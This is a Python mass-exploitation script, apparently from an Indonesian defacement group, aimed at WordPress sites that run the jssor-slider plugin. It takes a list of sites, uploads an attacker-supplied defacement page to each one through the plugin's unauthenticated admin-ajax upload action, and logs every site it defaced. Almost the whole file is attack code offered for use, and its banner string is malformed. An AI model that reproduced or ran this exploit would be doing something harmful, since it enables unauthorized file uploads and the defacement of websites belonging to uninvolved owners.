
import requests
from colorama import Fore, Style, Back, init
import sys
import os
is_windows = hasattr(sys, 'getwindowsversion')
requests.packages.urllib3.disable_warnings()
init()

if is_windows:
	os.system("cls")
else:
	os.system("clear")

banner = """
{}
  ##### LOGO #####
logo = """\x1b[1;91m _______ __          
\x1b[1;91m|_     _|  |--.-----.               \033[1;96m●▬▬▬▬▬▬▬▬▬\x1b[1;91mTools Warga +62\033[1;96m▬▬▬▬▬▬▬▬▬▬▬●
\x1b[1;92m  |   | |     |  -__|        \033[1;92m _____ ___ _       _   _____     _ 
\x1b[1;91m  |___| |__|__|_____|\x1b[1;91m๑▬▬▬▬▬✧»\033[1;92m|   __|  _| |_ ___| |_|   __|___| |___ ___
\x1b[1;92m ___      _     _ _  \x1b[1;97m๑▬▬▬▬▬✧»\033[1;92m|   __|  _| . | -_|   |  |  | -_| | .'| . | \033[1;93mBy.Sploit
\x1b[1;92m/ __|_ __| |___(_) |_\x1b[1;92m๑▬▬▬▬▬✧»\033[1;92m|_____|_| |___|___|_|_|_____|___|_|__,|  _|
\x1b[1;92m\__ \ '_ \ / _ \ |  _|                  \033[1;92m                           |_|   
\x1b[1;92m|___/ .__/_\___/_|\__|              \033[1;96m●▬▬▬▬▬▬▬▬▬\x1b[1;91mTools Warga +62\033[1;96m▬▬▬▬▬▬▬▬▬▬▬●
\x1b[1;92m    |_|               
\033[1;97m╔════════════════════════════════════════╗
\033[1;97m║\033[1;93m* \033[1;97mAuthor  : \x1b[1;92mTheSploit 	                 \033[1;97m║
\033[1;97m║\033[1;93m* \033[1;97mWhatsapp : \x1b[1;92m081316577616       	 \033[1;97m║
\033[1;97m║\033[1;93m* \033[1;97mGitHub  : \033[1;92m\033[4mhttps://github.com/TheSploit\033[0m\033[1;97m║
\033[1;97m╚════════════════════════════════════════╝"""
* Dork: inurl:/wp-content/jssor-slider/
* Author: TheSploit
{}* ==> 
""".format(Fore.RED, Fore.CYAN)

print Style.BRIGHT
print banner

exploit = "/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library"
defacesdirectory = "/wp-content/jssor-slider/jssor-uploads/"

vulnsf = open('defaceds.txt', 'a')

sites_vuln = []

if len(sys.argv) > 2:
	filename = sys.argv[1]
	deface = sys.argv[2]
	filen = open(filename, 'r')
	file = filen.readlines()
	for site in file:
		files = {'file': open(deface, 'rb')}
		r = requests.post(site + exploit, files=files, verify=False)
		resposta = r.text
		if "\"result\"" in resposta:
			print Fore.GREEN + "[!] WEBSITE VULN COK: {}".format(site)
			print Fore.BLUE + "[!] SUKSES NGEDEPES COK: {}/{}/{}".format(site, defacesdirectory, deface)
			sites_vuln.append("\n{}/{}/{}".format(site, defacesdirectory, deface))
	 	else:
	 		print Fore.RED + "[!] WEBSITE NGGA VULN COK: {}".format(site)

	vulnsf.writelines(sites_vuln)
	vulnsf.close()
	filen.close()

else:
	print Fore.RED+"[!] PENGGUNAAN: script.py <list> <deface.htm>"